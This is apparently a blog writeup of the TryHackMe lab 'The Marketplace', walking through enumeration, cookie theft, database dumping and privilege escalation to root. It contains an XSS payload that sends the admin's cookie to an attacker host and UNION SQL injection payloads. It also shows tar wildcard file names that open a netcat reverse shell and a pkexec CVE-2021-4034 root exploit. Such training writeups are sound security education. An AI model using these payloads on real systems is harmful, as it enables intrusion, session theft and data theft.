---
title: "The Marketplace"
date: 2025-03-26
image: /assets/img/tryhackme/TheMarketplace/TheMarketplace_image.jpg
description: Writeup of the TryHackMe-CTF The Marketplace
categories: [TryHackMe, Medium]
tags: [linux, xss, sqli, tar, pkexec]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>The Marketplace</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Can you take over The Marketplace's infrastructure?</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/marketplace">https://tryhackme.com/room/marketplace</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge The Marketplace.

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.182.139                             
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 08:01 EDT
  Nmap scan report for 10.10.182.139
  Host is up (0.042s latency).
  Not shown: 65532 filtered tcp ports (no-response)
  PORT      STATE SERVICE
  22/tcp    open  ssh
  80/tcp    open  http
  32768/tcp open  filenet-tms

  Nmap done: 1 IP address (1 host up) scanned in 160.46 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80,32768 10.10.182.139
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 08:04 EDT
  Nmap scan report for 10.10.182.139
  Host is up (0.040s latency).

  PORT      STATE SERVICE VERSION
  22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
  |   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
  |_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
  80/tcp    open  http    nginx 1.19.2
  |_http-server-header: nginx/1.19.2
  |_http-title: The Marketplace
  | http-robots.txt: 1 disallowed entry 
  |_/admin
  32768/tcp open  http    Node.js (Express middleware)
  |_http-title: The Marketplace
  | http-robots.txt: 1 disallowed entry 
  |_/admin
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 16.84 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

The web server displayed a marketplace, and the two usernames, as well as the login section caught, my attention:

![Marketplace](/assets/img/tryhackme/TheMarketplace/thm_themarketplace_1.jpg)

I analyzed the `robots.txt` file, which contained an /admin entry, but I wasn't able to access the site, due of missing permissions:
```html
User-Agent: *
Disallow: /admin
```

I continued analyzing the login mechanism and found that the error message indicated whether the username exists or not. Since I had already found two usernames, I was able to confirm both as valid.  then attempted a brute-force attack using Hydra but was unsuccessful due to this error message:
```text
No brute forcing please!
```

I created a test user and logged in. The only action I could perform was listing new items. I successfully listed a new item and, after analyzing it, reported it. A few seconds later, the administrator responded:
```text
From system
Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!
```

Since I knew an administrator would review the report, I considered stealing the cookie through a Cross-Site Scripting (XSS) attack. To do this, I created a new item called `test`, and included the following payload in the description:
```bash
<script>fetch('http://[attackerip]/test?cookie=' + document.cookie);</script>
```

I started a Python web server on my local machine and reported the item again. Shortly afterward, my web server received the administrator's JWT:

![Received JWT](/assets/img/tryhackme/TheMarketplace/thm_themarketplace_2.jpg)


After inserting the JWT in the request, I was able to access the admin panel and retrieved the first flag:

![Admin Access](/assets/img/tryhackme/TheMarketplace/thm_themarketplace_3.jpg)

### SQL injection

While analyzing the admin panel, the only feature I could access was user control. When accessing a user, the user's `ìd` was shown as the value of the user parameter. I inserted a quotation mark at the end of the number and received the following error message: 
```html
/admin?user=1'

<h2>
  Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39; at line 1
</h2>
```

This indicated that I had broken out of the SQL syntax somehow, suggesting the parameter was vulnerable to SQL injection. I proceeded by injection a `union` attack to gain access to more data in the database. The initial SQL query returned four values, so the following `union` query was succeeded:

![SQLi Union](/assets/img/tryhackme/TheMarketplace/thm_themarketplace_4.jpg)

With this working SQL query, I continued enumerating the database. Due to encoding issues, I used Burp Suite's Hexavector plugin:
```bash
payload:  /admin?user=<@urlencode>5 union select 1,database(),3,4</@urlencode>
response: marketplace

payload:  /admin?user=<@urlencode>5 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'</@urlencode>
response: items,messages,users

payload:  /admin?user=<@urlencode>5 union select 1,group_concat(COLUMN_NAME),3,4 from information_schema.columns where table_name = 'messages'</@urlencode>
response: id,user_from,user_to,message_content,is_read

payload:  /admin?user=<@urlencode>5 union select 1,message_content,3,4 from messages</@urlencode>
```

I started by searching for existing databases, which I then used to enumerate the tables. The messages table, caught my attention, so I enumerated its columns. Upon accessing the messages, I discoverd an interesting one:

![Message](/assets/img/tryhackme/TheMarketplace/thm_themarketplace_5.jpg)

Great! I obtained an SSH password. I attempted to log in first as michael and then as jake. I successfully logged in as jake and retrieved the first flag:
```bash
kali@kali:~/ctf/marketplace$ ssh michael@10.10.182.139
  michael@10.10.182.139's password: 
  Permission denied, please try again.
kali@kali:~/ctf/marketplace$ ssh jake@10.10.182.139
jake@the-marketplace:~$ id
  uid=1000(jake) gid=1000(jake) groups=1000(jake)
jake@the-marketplace:~$ cat user.txt 
  THM{c[removed]4}
```

## Privilege Escalation michael
I continued by running `sudo -l` and got the following output:
```bash
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

The script contained the following:
```bash
jake@the-marketplace:~$ cat /opt/backups/backup.sh 
  #!/bin/bash
  echo "Backing up files...";
  tar cf /opt/backups/backup.tar *
```

The `tar` command stood out to me because of the wildcard usage. After researching the command, I found this page on <a href="https://gtfobins.github.io/gtfobins/tar/#shell">GTFObins</a>. To exploit this, I created two files that tar would interpret as parameters with the following names:
```bash
jake@the-marketplace:~$ echo "file" > '--checkpoint=1'
jake@the-marketplace:~$ echo "file" > '--checkpoint-action=exec=busybox nc [attackerip] 9001 -e bash'
```

When I executed the script as Michael, I encountered the following error:
```bash
jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh 
  Backing up files...
  tar: /opt/backups/backup.tar: Cannot open: Permission denied
  tar: Error is not recoverable: exiting now
```

I checked the permissions and found out that Michael couldn't access the `tar` file:
```bash
jake@the-marketplace:~$ ls -al /opt/backups/
  total 24
  drwxrwxrwt 2 root    root     4096 Aug 23  2020 .
  drwxr-xr-x 4 root    root     4096 Aug 23  2020 ..
  -rwxr-xr-x 1 michael michael    73 Aug 23  2020 backup.sh
  -rw-rw-r-- 1 jake    jake    10240 Aug 23  2020 backup.tar
```

After changing the permissions, I was able to execute the script and escalate my privileges to Michael:
```bash
jake@the-marketplace:~$ chmod 777 /opt/backups/backup.tar
jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh
  Backing up files...

michael@the-marketplace:~$ id
  uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

## Privilege Escalation root

Next, I checked for SUID bits and discoverd that `pkexec` had its SUID bit set. I used the exploit described in <a href="https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py">CVE-2021-4034</a> and successfully gained root access:
```bash
michael@the-marketplace:~$ find / -perm /4000 -type f 2>/dev/null
  [...]
  /usr/bin/pkexec
  [...]
michael@the-marketplace:/tmp$ python3 exploit.py 
  Do you want to choose a custom payload? y/n (n use default payload)  n
  [+] Cleaning pervious exploiting attempt (if exist)
  [+] Creating shared library for exploit code.
  [+] Finding a libc library to call execve
  [+] Found a library at <CDLL 'libc.so.6', handle 7f7145860000 at 0x7f714430a860>
  [+] Call execve() with chosen payload
  [+] Enjoy your root shell
# id
  uid=0(root) gid=1002(michael) groups=1002(michael),999(docker)
# cat /root/root.txt
  THM{d[removed]2}
```

solved! :)